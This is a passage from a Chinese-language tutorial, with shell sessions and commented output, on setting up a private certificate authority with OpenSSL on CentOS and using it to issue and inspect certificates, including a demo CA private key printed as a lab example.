139637690505104:error:28069065:lib(40):UI_set_result:result too small:ui_lib.c:831:You must type<span style="color: #a020f0;"> in</span> 4 to 1023 characters
Enter pass phrase:
Verifying - Enter pass phrase:
<span style="color: #483d8b;">umask</span> 77 ; <span style="color: #8b2252;">\</span>
/usr/bin/openssl req -utf8 -new -key app.key -x509 -days 365 -out app.crt 
Enter pass phrase for app.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color: #8b2252;">'.'</span>, the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:hubei
Locality Name (eg, city) [Default City]:wuhan
Organization Name (eg, company) [Default Company Ltd]:meu
Organizational Unit Name (eg, section) []:it
Common Name (eg, your name or your server<span style="color: #8b2252;">'s hostname) []:www.meu.org</span>
<span style="color: #8b2252;">Email Address []:admin@meu.org</span>

<span style="color: #8b2252;">[root@Centos7 certs]#ls</span>
<span style="color: #8b2252;">app.crt  ca-bundle.crt        make-dummy-cert  renew-dummy-cert</span>
<span style="color: #8b2252;">app.key  ca-bundle.trust.crt  Makefile</span>

<span style="color: #8b2252;">[root@Centos7 certs]#openssl x509 -in app.crt -noout -text</span>
<span style="color: #8b2252;">Certificate:</span>
<span style="color: #8b2252;">    Data:</span>
<span style="color: #8b2252;">        Version: 3 (0x2)</span>
<span style="color: #8b2252;">        Serial Number:</span>
<span style="color: #8b2252;">            89:3c:a6:35:21:46:a3:1d</span>
<span style="color: #8b2252;">    Signature Algorithm: sha256WithRSAEncryption</span>
<span style="color: #8b2252;">        Issuer: C=CN, ST=hubei, L=wuhan, O=meu, OU=it, CN=www.meu.org/emailAddress=admin@meu.org</span>
<span style="color: #8b2252;">        Validity</span>
<span style="color: #8b2252;">            Not Before: May 24 04:48:53 2020 GMT</span>
<span style="color: #8b2252;">            Not After : May 24 04:48:53 2021 GMT</span>
<span style="color: #8b2252;">        Subject: C=CN, ST=hubei, L=wuhan, O=meu, OU=it, CN=www.meu.org/emailAddress=admin@meu.org</span>
<span style="color: #8b2252;">        Subject Public Key Info:</span>
<span style="color: #8b2252;">            Public Key Algorithm: rsaEncryption</span>
<span style="color: #8b2252;">                Public-Key: (2048 bit)</span>
<span style="color: #8b2252;">                Modulus:</span>
<span style="color: #8b2252;">                    00:ca:64:c0:73:2d:59:f0:35:49:5f:1f:4b:e9:91:</span>
<span style="color: #8b2252;">                    5b:c4:94:18:31:3a:f0:44:53:a9:20:c7:9d:5b:46:</span>
<span style="color: #8b2252;">                    d8:54:7f:32:cf:6c:c0:d0:0e:a5:7a:1e:b5:f4:17:</span>
<span style="color: #8b2252;">                    40:65:4e:13:57:0d:cb:1c:a1:86:0e:5d:18:f4:07:</span>
<span style="color: #8b2252;">                    7f:d3:b2:d7:f8:82:52:77:37:70:29:57:bb:ac:fd:</span>
<span style="color: #8b2252;">                    8a:6b:6c:d3:55:8f:1f:66:25:16:54:77:ba:8f:f6:</span>
<span style="color: #8b2252;">                    2b:15:aa:59:c2:9b:3b:4a:be:9d:50:06:e7:38:54:</span>
<span style="color: #8b2252;">                    8c:0a:52:7c:08:38:18:17:32:fb:13:bb:51:2e:81:</span>
<span style="color: #8b2252;">                    6a:43:ad:88:e1:6b:6d:df:c6:21:2d:4b:9d:d9:9c:</span>
<span style="color: #8b2252;">                    1e:a4:8d:f3:ca:ed:10:8b:38:1b:8f:0f:c0:0d:73:</span>
<span style="color: #8b2252;">                    f8:a6:67:cb:6f:50:2e:73:ce:a2:56:fb:2b:e3:59:</span>
<span style="color: #8b2252;">                    3a:1f:65:d1:be:4b:28:84:31:69:65:13:33:2d:d8:</span>
<span style="color: #8b2252;">                    1f:2b:e1:9a:ba:b6:ac:06:14:d5:8b:70:d9:c8:7c:</span>
<span style="color: #8b2252;">                    59:c3:4f:d0:48:b7:ce:47:a3:c0:e1:e1:0b:15:e7:</span>
<span style="color: #8b2252;">                    e1:68:04:93:b3:17:f0:f9:c5:24:91:10:8f:36:ad:</span>
<span style="color: #8b2252;">                    d8:f5:8e:c2:5c:13:76:b5:64:aa:1e:56:5f:3b:37:</span>
<span style="color: #8b2252;">                    f0:47:15:7b:44:d5:9f:f1:97:7e:7b:77:4a:8f:1a:</span>
<span style="color: #8b2252;">                    db:9d</span>
<span style="color: #8b2252;">                Exponent: 65537 (0x10001)</span>
<span style="color: #8b2252;">        X509v3 extensions:</span>
<span style="color: #8b2252;">            X509v3 Subject Key Identifier: </span>
<span style="color: #8b2252;">                7F:9C:20:BD:21:CC:AB:3B:2A:46:D6:00:BC:84:47:46:90:E8:1D:73</span>
<span style="color: #8b2252;">            X509v3 Authority Key Identifier: </span>
<span style="color: #8b2252;">                keyid:7F:9C:20:BD:21:CC:AB:3B:2A:46:D6:00:BC:84:47:46:90:E8:1D:73</span>

<span style="color: #8b2252;">            X509v3 Basic Constraints: </span>
<span style="color: #8b2252;">                CA:TRUE</span>
<span style="color: #8b2252;">    Signature Algorithm: sha256WithRSAEncryption</span>
<span style="color: #8b2252;">         41:4a:41:87:f2:c9:99:54:64:96:0c:e2:1d:8a:05:fb:c3:77:</span>
<span style="color: #8b2252;">         0f:45:34:fe:3a:7e:64:3b:24:00:a3:0d:c0:12:e1:35:ae:b5:</span>
<span style="color: #8b2252;">         20:8c:00:61:e6:5c:ec:dd:34:be:9e:0c:5e:2f:db:db:37:9a:</span>
<span style="color: #8b2252;">         5f:52:58:e7:84:90:14:5c:61:0d:d8:91:8a:94:2a:b7:b3:04:</span>
<span style="color: #8b2252;">         17:f9:38:9b:27:07:36:b1:49:5e:e3:27:ad:31:c8:12:64:85:</span>
<span style="color: #8b2252;">         7f:a1:09:85:31:da:6b:21:30:50:e2:44:ee:df:66:8d:85:3c:</span>
<span style="color: #8b2252;">         ce:5c:f2:8c:53:0b:a3:7c:9e:05:bf:fd:90:0e:a9:dc:0c:a5:</span>
<span style="color: #8b2252;">         85:7d:69:c3:3f:96:37:56:5c:0e:a3:a0:61:0d:09:b3:c7:82:</span>
<span style="color: #8b2252;">         d3:42:d5:ba:bf:b8:c7:c9:f8:6c:60:79:ed:35:d2:52:06:f9:</span>
<span style="color: #8b2252;">         f1:9f:38:48:c4:6c:17:cb:54:d1:62:14:e0:34:43:67:6a:f1:</span>
<span style="color: #8b2252;">         6d:d5:52:11:1a:12:5e:19:08:3c:13:90:d5:e4:f6:a1:cb:17:</span>
<span style="color: #8b2252;">         d6:32:c0:cd:21:53:44:33:96:66:b1:1e:d5:cc:70:2b:2b:13:</span>
<span style="color: #8b2252;">         02:21:3c:74:8e:8c:c4:57:8b:5b:94:9f:d2:85:b5:1e:20:2f:</span>
<span style="color: #8b2252;">         89:e5:96:83:62:1d:ee:61:14:87:d9:c0:85:5c:3d:5e:6a:32:</span>
<span style="color: #8b2252;">         1d:ce:1d:90</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e588d3b4-e6aa-4f1c-868b-04cc28a348c1" class="outline-4">
<h4 id="h:e588d3b4-e6aa-4f1c-868b-04cc28a348c1">实战案例</h4>
<div class="outline-text-4" id="text-h:e588d3b4-e6aa-4f1c-868b-04cc28a348c1">
</div>
<div id="outline-container-h:825e4f0e-0e90-4a07-acfa-e1f57540a402" class="outline-5">
<h5 id="h:825e4f0e-0e90-4a07-acfa-e1f57540a402"><b>创建CA相关目录和文件</b></h5>
<div class="outline-text-5" id="text-h:825e4f0e-0e90-4a07-acfa-e1f57540a402">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#mkdir -pv /etc/pki/CA/{certs,crl,newcerts,private}
[root@centos8 ~]#tree /etc/pki/CA
/etc/pki/CA
&#9500;&#9472;&#9472; certs
&#9500;&#9472;&#9472; crl
&#9500;&#9472;&#9472; newcerts
&#9492;&#9472;&#9472; private
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;CA&#25152;&#38656;&#35201;&#30340;&#25991;&#20214;</span>
[root@centos8 ~]#touch /etc/pki/CA/index.txt
[root@centos8 ~]#echo 01 &gt; /etc/pki/CA/serial 
<span style="color: #b22222;">#</span><span style="color: #b22222;">echo 0F &gt; /etc/pki/CA/serial</span>
</pre>
</div>

<p>
index.txt和serial文件在颁发证书时需要使用，如果不存在，会出现以下错误提示
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl ca -in /data/app1/app1.csr -out /etc/pki/CA/certs/app1.crt -days 1000
Using configuration from /etc/pki/tls/openssl.cnf
140040142845760:error:02001002:system library:fopen:No such file or
directory:crypto/bio/bss_file.c:72:fopen(<span style="color: #8b2252;">'/etc/pki/CA/index.txt'</span>,<span style="color: #8b2252;">'r'</span>)
140040142845760:error:2006D080:BIO routines:BIO_new_file:no such
file:crypto/bio/bss_file.c:79:
[root@centos8 ~]#openssl ca -in /data/app1/app1.csr -out /etc/pki/CA/certs/app1.crt -days 1000
Using configuration from /etc/pki/tls/openssl.cnf
/etc/pki/CA/serial: No such file or directory
error while loading serial number
140240559408960:error:02001002:system library:fopen:No such file or
directory:crypto/bio/bss_file.c:72:fopen(<span style="color: #8b2252;">'/etc/pki/CA/serial'</span>,<span style="color: #8b2252;">'r'</span>)
140240559408960:error:2006D080:BIO routines:BIO_new_file:no such
file:crypto/bio/bss_file.c:79:
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9b28f64c-a4b6-40ca-bc87-327dec6d143f" class="outline-5">
<h5 id="h:9b28f64c-a4b6-40ca-bc87-327dec6d143f"><b>创建CA的私钥</b></h5>
<div class="outline-text-5" id="text-h:9b28f64c-a4b6-40ca-bc87-327dec6d143f">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cd /etc/pki/CA/
[root@centos8 CA]#(<span style="color: #483d8b;">umask</span> 066; openssl genrsa -out private/cakey.pem 2048)
[root@centos8 CA]#tree
<span style="color: #483d8b;">.</span>
&#9500;&#9472;&#9472; certs
&#9500;&#9472;&#9472; crl
&#9500;&#9472;&#9472; index.txt
&#9500;&#9472;&#9472; newcerts
&#9492;&#9472;&#9472; private
    &#9492;&#9472;&#9472; cakey.pem

[root@centos8 CA]#ll private/
-rw------- 1 root root 1679 May 21 09:05 cakey.pem
[root@centos8 CA]#cat private/cakey.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAvpyGHD0NWrXCWDeEp1BK6RshJItFyMAM6kntDPHMPxhzuMLC
uSubbb+afJv7TXHTpUOuVJJxu0e8vK2aTmBuhKR6/C/IFY78MQip6ELNYy1cCKrs
BHAawXC6Zi71v5VMwlPkDLcjTPMnlpQrRRJtBB+fzyMaTBvF+0GJPU6vLCqOmRB9
0jB2ElpLVWAIEHjVqpIoXPNFjYfi0yYxnjWTKy5ZyGINiSB5/kJF0epE2EWdhD3f
v3oYZcjY0uSbjN7SDWFCEz1OF1K9jiWQbUBolBEOStq607rsRJQ9AcXAlk+voHuA
6jMMiuzK8daclFxhHT8M/wVO4gxtwLAcSyRSdwIDAQABAoIBABEO3u2eBRjuFTNh
3IxAokOUOvYTRK5/iWhaL02uQfIPlSOewmBh56n9sKygJPA8VI2ArhRBes4g0GIu
QxXqiVlzgtIY0JYlUqpstQ/lEo5im87mxPJsueg/116Xq0R27wShD1KX/R/AzvUp
02l+CaWJ0vptkMfo4GHo7og/B2wzRyzqh6ZMQI236cKWLXTf588T+kkHgDVPJfUl
sU7jEQ+OHofHGrGFEWIP7jjr4KTS+Oe4Hosk3O9ef7uhpKV3gaPTkwB94PUYXR+v
xNWInmiVkfJRDI1FjNwLdxVfiEYLstKa3ncXTRNDtGCDJ1Pt+YG8Pd6i1rPdrsUK
NeGnMnECgYEA6uGm2jwA3qDOBNpQ3fTghox4RkjGHfEkab9qZc61iy8eQpBKmjcU
1N2QJ4I0qyqHKwxLZB8e/iIF4STzO3qkrWPx66sxMuEnJhcXWNJm/3etKbDFHbmQ
HU+DbDoE/nhYhsMuXB3u1q5O01S1OXAZUBgKQesN8bGXRS3ntX4tXf8CgYEAz7/k
tC5DMkRZ4j3HcpsqHBfIBpzObTIAP2d3mM2xtKz2o8XKm6sZcTlBn4SmpdN5JQyR
9sqta7QB3GSvD4jQa9alS33KIickHkAQEkWgie0IQETtBqyxEPjOKIV3nkzCFqZR
PmC54VVFmBnP0JDCdUtRLqVqq1VeILqMNp5M+4kCgYEAnCgHmSG5Zkm8jodiqh4q
w+lR8VBivvdaQR/sqeDi27UoxhJONvcV12uyckHjqESu9tTGrrruDQErrYK2Xz3r
jAddiFQZcn00XOOPNxMzPPcg3g3TDy8WfBYoBuUP+uqh2H6dLMsNxha++0te7N/1
REWnVCnk7GIocurRGN3ZZZsCgYAXv9QhVPiRkobD+lQGof5aX82aE+r1SLYGiYl+
imU6RlubtUzIJvMtomICHmP+qQI8XgeBswHIQjfEPi5VFErfSRZ0XtjwtpDGdIRh
0lvb6KD81+RQ0wUa75aBw2A9VIELnc/D1cLqI5llHe5H5YSVbBrHvllHZObxzuGg
jNA4IQKBgQCk9pjm+VsQtRLxD4mgNp/wtexBNUtuHVKCYiWilHLfbk0ytmR8qH6K
G88Ar4Q1mWU2dJdn1UVEBlp/kVC1ASrI2sK3Zj9SrJ8DB9aDUXwRmNn3Nhfzqa2/
<span style="color: #a0522d;">f8vH5vmlj6EM5oUQMiVfm5v4DwosLESmXWSH9V9OaPX5FgzwtrGKew</span>==
-----END RSA PRIVATE KEY-----
</pre>
</div>
</div>
</div>
<div id="outline-container-h:bd2e18ea-2e5d-45d0-9eb4-310c42b0e60c" class="outline-5">
<h5 id="h:bd2e18ea-2e5d-45d0-9eb4-310c42b0e60c"><b>给CA颁发自签名证书</b></h5>
<div class="outline-text-5" id="text-h:bd2e18ea-2e5d-45d0-9eb4-310c42b0e60c">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -days 36500 -out /etc/pki/CA/cacert.pem</span>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color: #8b2252;">'.'</span>, the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:beijing    
Locality Name (eg, city) [Default City]:beijing
Organization Name (eg, company) [Default Company Ltd]:ops  
Organizational Unit Name (eg, section) []:devops
Common Name (eg, your name or your server<span style="color: #8b2252;">'s hostname) []:ca.xcw.org          </span>
<span style="color: #8b2252;">Email Address []:</span>

<span style="color: #8b2252;">[root@centos8 ~]#tree /etc/pki/CA</span>
<span style="color: #8b2252;">/etc/pki/CA</span>
<span style="color: #8b2252;">&#9500;&#9472;&#9472; cacert.pem</span>
<span style="color: #8b2252;">&#9500;&#9472;&#9472; certs</span>
<span style="color: #8b2252;">&#9500;&#9472;&#9472; crl</span>
<span style="color: #8b2252;">&#9500;&#9472;&#9472; index.txt</span>
<span style="color: #8b2252;">&#9500;&#9472;&#9472; newcerts</span>
<span style="color: #8b2252;">&#9492;&#9472;&#9472; private</span>
<span style="color: #8b2252;">    &#9492;&#9472;&#9472; cakey.pem</span>

<span style="color: #8b2252;">[root@centos8 ~]#cat /etc/pki/CA/cacert.pem </span>

<span style="color: #8b2252;"># &#26597;&#30475;&#35777;&#20070;&#20869;&#23481;</span>
<span style="color: #8b2252;"># openssl x509 -in cacert.pem  -noout -text</span>
<span style="color: #8b2252;">Certificate:</span>
<span style="color: #8b2252;">    Data:</span>
<span style="color: #8b2252;">        Version: 3 (0x2) # &#29256;&#26412;&#21495;</span>
<span style="color: #8b2252;">        Serial Number:   # &#24207;&#21015;&#21495;</span>
<span style="color: #8b2252;">            8f:a5:27:53:9f:a7:84:9c</span>
<span style="color: #8b2252;">    Signature Algorithm: sha256WithRSAEncryption # &#31614;&#21517;&#31639;&#27861;</span>
<span style="color: #8b2252;">        Issuer: C=CN, ST=beijing, L=beijing, O=ops, OU=devops, CN=ca.xcw.org   # &#39041;&#21457;&#32773;</span>
<span style="color: #8b2252;">        Validity # &#26377;&#25928;&#26399;</span>
<span style="color: #8b2252;">            Not Before: Mar  9 17:47:05 2021 GMT</span>
<span style="color: #8b2252;">            Not After : Mar  7 17:47:05 2031 GMT</span>
<span style="color: #8b2252;">        Subject: C=CN, ST=beijing, L=beijing, O=ops, OU=devops, CN=ca.xcw.org  # &#39041;&#21457;&#32473;</span>
<span style="color: #8b2252;">        Subject Public Key Info: # &#20844;&#38053;</span>
<span style="color: #8b2252;">            Public Key Algorithm: rsaEncryption</span>
<span style="color: #8b2252;">                Public-Key: (2048 bit)</span>
<span style="color: #8b2252;">                Modulus:</span>
<span style="color: #8b2252;">                    00:dd:e3:7f:fd:a0:d4:96:28:7f:ff:8f:2f:ed:20:</span>
<span style="color: #8b2252;">                    43:5e:08:83:39:51:37:81:f5:84:80:37:d3:1e:ea:</span>
<span style="color: #8b2252;">                    c2:f5:9f:e8:b5:8d:c3:c0:bb:4b:b1:a7:a7:da:66:</span>
<span style="color: #8b2252;">                    ab:a9:6e:77:98:3c:29:c7:d5:44:ee:7a:b1:b8:b8:</span>
<span style="color: #8b2252;">                    b9:8c:d6:4e:e9:5c:65:75:47:90:e9:ca:e3:78:46:</span>
<span style="color: #8b2252;">                    e4:e0:e8:18:53:cd:1e:94:fd:7d:3b:57:35:96:db:</span>
<span style="color: #8b2252;">                    59:f5:55:e9:f7:fd:f4:65:2b:c5:6d:4e:2b:b5:59:</span>
<span style="color: #8b2252;">                    f5:5e:46:96:5f:23:43:25:77:cd:5f:06:ad:61:75:</span>
<span style="color: #8b2252;">                    3e:fb:6b:20:e4:ed:13:73:38:a2:76:36:07:f7:21:</span>
<span style="color: #8b2252;">                    ae:26:29:34:69:69:64:98:73:43:f8:ee:d8:bc:84:</span>
<span style="color: #8b2252;">                    2a:09:25:22:e8:59:f9:e4:4d:2f:d7:f8:fb:6a:1e:</span>
<span style="color: #8b2252;">                    36:da:9c:88:e1:b1:60:c2:0c:35:72:c1:5e:f4:d6:</span>
<span style="color: #8b2252;">                    4a:27:d7:28:52:7b:bd:0e:7c:3a:35:46:ba:85:d6:</span>
<span style="color: #8b2252;">                    2d:16:01:4d:b5:5a:a5:c6:14:7c:49:7c:26:b9:16:</span>
<span style="color: #8b2252;">                    a2:d9:df:99:81:46:a3:c1:7e:09:ae:c6:d0:06:bd:</span>
<span style="color: #8b2252;">                    1a:5a:ee:a8:8b:38:f0:8f:06:d4:62:db:c1:a8:a7:</span>
<span style="color: #8b2252;">                    e6:1d:ec:8c:19:0a:ac:48:17:f5:dd:de:6a:4e:5b:</span>
<span style="color: #8b2252;">                    8b:6f</span>
<span style="color: #8b2252;">                Exponent: 65537 (0x10001)</span>
<span style="color: #8b2252;">        X509v3 extensions:</span>
<span style="color: #8b2252;">            X509v3 Subject Key Identifier:   # &#20351;&#29992;&#32773;&#23494;&#38053;&#26631;&#35782;&#31526;</span>
<span style="color: #8b2252;">                36:76:B8:8F:C5:2E:C9:3A:CD:A6:F6:5D:18:BA:D2:9C:C8:A0:CA:85</span>
<span style="color: #8b2252;">            X509v3 Authority Key Identifier: # &#25480;&#26435;&#23494;&#38053;&#26631;&#35782;&#31526;</span>
<span style="color: #8b2252;">                keyid:36:76:B8:8F:C5:2E:C9:3A:CD:A6:F6:5D:18:BA:D2:9C:C8:A0:CA:85</span>

<span style="color: #8b2252;">            X509v3 Basic Constraints: </span>
<span style="color: #8b2252;">                CA:TRUE</span>
<span style="color: #8b2252;">    Signature Algorithm: sha256WithRSAEncryption</span>
<span style="color: #8b2252;">         ab:42:dc:6e:0f:a6:da:48:36:29:d9:e6:6c:48:a7:77:cd:42:</span>
<span style="color: #8b2252;">         2b:29:7b:da:74:73:f2:b2:16:bb:fd:27:77:6c:44:a4:a8:ad:</span>
<span style="color: #8b2252;">         26:cc:f4:0a:2a:08:68:3e:22:cc:fc:7f:3d:4d:65:9f:27:3c:</span>
<span style="color: #8b2252;">         92:f5:d0:a1:53:86:a9:3c:cd:bf:dc:a8:d8:ec:2a:03:87:7a:</span>
<span style="color: #8b2252;">         63:88:ae:2d:78:be:48:a7:7b:76:6f:f5:00:28:dc:6f:82:59:</span>
<span style="color: #8b2252;">         ba:82:58:10:65:8f:9a:92:d1:93:a3:7a:a3:9e:d8:1f:f9:92:</span>
<span style="color: #8b2252;">         eb:ec:8e:60:cd:13:4a:44:cb:d2:8e:b1:60:1b:9f:72:df:d6:</span>
<span style="color: #8b2252;">         11:eb:cd:9f:d5:3a:e3:f1:76:4c:00:cf:8e:2a:27:fc:df:bc:</span>
<span style="color: #8b2252;">         84:8e:f0:90:60:df:5e:67:af:17:1e:22:b2:3a:16:c8:26:f8:</span>
<span style="color: #8b2252;">         63:d9:a5:21:6f:87:50:32:87:15:c8:59:16:ab:26:05:12:72:</span>
<span style="color: #8b2252;">         9e:db:53:9a:cd:e6:ed:cc:97:ca:bd:b9:d6:e6:a7:0d:5a:31:</span>
<span style="color: #8b2252;">         d5:48:1b:0f:ec:bf:08:ea:8d:9d:ff:cd:be:36:14:5b:d7:68:</span>
<span style="color: #8b2252;">         99:ec:22:39:dc:e3:c0:4b:9e:a4:ed:1e:c8:00:97:81:41:34:</span>
<span style="color: #8b2252;">         f0:72:3c:28:4d:47:a8:a4:c3:d0:5f:7d:b1:71:10:2a:24:9b:</span>
<span style="color: #8b2252;">         72:e5:2e:f6</span>
<span style="color: #8b2252;">[root@centos8 ~]#sz /etc/pki/CA/cacert.pem </span>
<span style="color: #8b2252;">#&#23558;&#25991;&#20214;cacert.pem&#20256;&#21040;windows&#19978;&#65292;&#20462;&#25913;&#25991;&#20214;&#21517;&#20026;cacert.pem.crt&#65292;&#21452;&#20987;&#21487;&#20197;&#30475;&#21040;&#19979;&#38754;&#26174;&#31034;</span>
</pre>
</div>


<figure id="orgfe427c8">
<img src="images/image-20210310020337875.png" alt="image-20210310020337875.png" width="10%">

</figure>


<figure id="orgdb01e21">
<img src="images/image-20210310020351661.png" alt="image-20210310020351661.png" width="10%">

</figure>


<figure id="org1ca03d4">
<img src="images/image-20210310020406317.png" alt="image-20210310020406317.png" width="10%">

</figure>
</div>
</div>
<div id="outline-container-h:a0b8e047-7f8d-43da-be67-92ddbadac8db" class="outline-5">
<h5 id="h:a0b8e047-7f8d-43da-be67-92ddbadac8db"><b>用户生成私钥和证书申请</b></h5>
<div class="outline-text-5" id="text-h:a0b8e047-7f8d-43da-be67-92ddbadac8db">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#mkdir /data/app1
[root@centos8 ~]#(<span style="color: #483d8b;">umask</span> 066; openssl genrsa  -out /data/app1/app1.key 2048)
Generating RSA private key, 2048 bit long modulus (2 primes)
...............+++++
.......+++++
e is 65537 (0x010001)
[root@centos8 ~]#cat /data/app1/app1.key 

[root@centos8 ~]#openssl req -new -key /data/app1/app1.key -out /data/app1/app1.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color: #8b2252;">'.'</span>, the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22269;&#23478;</span>
State or Province Name (full name) []:beijing  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30465;&#20221;</span>
Locality Name (eg, city) [Default City]:bj
Organization Name (eg, company) [Default Company Ltd]:ops <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32452;&#32455; # macth &#30003;&#35831;&#35777;&#20070;&#26102;&#22269;&#23478;&#30465;&#20221;&#32452;&#32455;&#36825;3&#39033;&#24517;&#39035;&#21644;CA&#19968;&#33268;</span>
Organizational Unit Name (eg, section) []:it
Common Name (eg, your name or your server<span style="color: #8b2252;">'s hostname) []:app1.xcw.org</span>
<span style="color: #8b2252;">Email Address []:root@xcw.org</span>

<span style="color: #8b2252;">Please enter the following '</span>extra<span style="color: #8b2252;">' attributes</span>
<span style="color: #8b2252;">to be sent with your certificate request</span>
<span style="color: #8b2252;">A challenge password []:</span>
<span style="color: #8b2252;">An optional company name []:.</span>
<span style="color: #8b2252;">[root@centos8 ~]#ll /data/app1/</span>
<span style="color: #8b2252;">total 8</span>
<span style="color: #8b2252;">-rw-r--r-- 1 root root 1045 May 21 09:34 app1.csr</span>
<span style="color: #8b2252;">-rw------- 1 root root 1675 May 21 09:31 app1.key</span>
</pre>
</div>

<p>
<b>默认有三项内容必须和CA一致</b> ：国家，省份，组织，如果不同，会出现下面的提示
</p>

<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#openssl ca -in /data/app2/app2.csr -out /etc/pki/CA/certs/app2.crt
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
The stateOrProvinceName field is different between
CA certificate (beijing) and the request (hubei)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a9cc6782-136b-43b5-97d1-c338eb973a38" class="outline-5">
<h5 id="h:a9cc6782-136b-43b5-97d1-c338eb973a38"><b>CA颁发证书</b></h5>
<div class="outline-text-5" id="text-h:a9cc6782-136b-43b5-97d1-c338eb973a38">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">openssl ca -in /data/app1/app1.csr  -out /etc/pki/CA/certs/app1.crt -days 1000 </span>
Using configuration from /etc/pki/tls/openssl.cnf
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: 1 (0x1) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39041;&#21457;&#35777;&#20070;&#30340;&#32534;&#21495;</span>
        Validity               <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26377;&#25928;&#26399;</span>
            Not Before: Mar  9 23:43:22 2021 GMT
            Not After : Dec  4 23:43:22 2023 GMT
        Subject:               <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39041;&#21457;&#32473;</span>
            countryName               = CN
            stateOrProvinceName       = beijing
            organizationName          = ops
            organizationalUnitName    = it
            commonName                = app1.xcw.org
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            Netscape Comment: 
                OpenSSL Generated Certificate
            X509v3 Subject Key Identifier: 
                03:28:C4:A1:46:73:25:C0:FC:2B:7D:AE:6D:D9:BB:9D:47:77:5F:59
            X509v3 Authority Key Identifier: 
                keyid:36:76:B8:8F:C5:2E:C9:3A:CD:A6:F6:5D:18:BA:D2:9C:C8:A0:CA:85

Certificate is to be certified until Dec  4 23:43:22 2023 GMT (1000 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
Data Base Updated

<span style="color: #b22222;"># </span><span style="color: #b22222;">tree /etc/pki/CA/</span>
/etc/pki/CA/
&#9500;&#9472;&#9472; cacert.pem
&#9500;&#9472;&#9472; certs
&#9474;&#160;&#160; &#9492;&#9472;&#9472; app1.crt
&#9500;&#9472;&#9472; crl
&#9500;&#9472;&#9472; index.txt
&#9500;&#9472;&#9472; index.txt.attr <span style="color: #b22222;">#</span>
&#9500;&#9472;&#9472; index.txt.old
&#9500;&#9472;&#9472; newcerts
&#9474;&#160;&#160; &#9492;&#9472;&#9472; 01.pem <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21644; app1.crt&#20869;&#23481;&#19968;&#26679;</span>
&#9500;&#9472;&#9472; private
&#9474;&#160;&#160; &#9492;&#9472;&#9472; cakey.pem
&#9500;&#9472;&#9472; serial
&#9492;&#9472;&#9472; serial.old
<span style="color: #b22222;"># </span><span style="color: #b22222;">cat index.txt.attr </span>
unique_subject = yes <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35777;&#20070;&#30340;&#30003;&#35831;&#32773;&#26159;&#21542;&#21807;&#19968;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0f1e74c3-0124-4c1c-8a80-15681c21954d" class="outline-5">
<h5 id="h:0f1e74c3-0124-4c1c-8a80-15681c21954d">查看证书</h5>
<div class="outline-text-5" id="text-h:0f1e74c3-0124-4c1c-8a80-15681c21954d">
<div class="org-src-container">
<pre class="src src-sh">[root@centos8 ~]#cat /etc/pki/CA/certs/app1.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: <span style="color: #a0522d;">C</span>=CN, <span style="color: #a0522d;">ST</span>=beijing, <span style="color: #a0522d;">L</span>=beijing, <span style="color: #a0522d;">O</span>=ops, <span style="color: #a0522d;">OU</span>=devops, <span style="color: #a0522d;">CN</span>=ca.xcw.org
        Validity
            Not Before: Mar  9 23:43:22 2021 GMT
            Not After : Dec  4 23:43:22 2023 GMT
        Subject: <span style="color: #a0522d;">C</span>=CN, <span style="color: #a0522d;">ST</span>=beijing, <span style="color: #a0522d;">O</span>=ops, <span style="color: #a0522d;">OU</span>=it, <span style="color: #a0522d;">CN</span>=app1.xcw.org
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:f7:93:c6:9c:ac:86:c5:81:7f:c8:92:70:3d:53:
                    06:8e:4e:c8:f9:5a:36:d0:f8:30:cb:6c:b8:a7:8a:
                    ef:0b:10:10:15:5b:ec:d7:d5:3c:85:fa:0f:dc:d3:
                    e8:e8:54:01:9a:15:a5:58:71:70:f4:7e:84:4b:5d:
                    1b:44:1b:82:11:44:7c:6c:a6:93:1b:ae:f4:09:f9:
                    dc:13:95:e7:e1:ef:e6:e4:d8:05:82:ca:fa:3d:f0:
                    cb:12:5f:d7:8a:80:09:2d:bf:dd:47:63:8d:60:be:
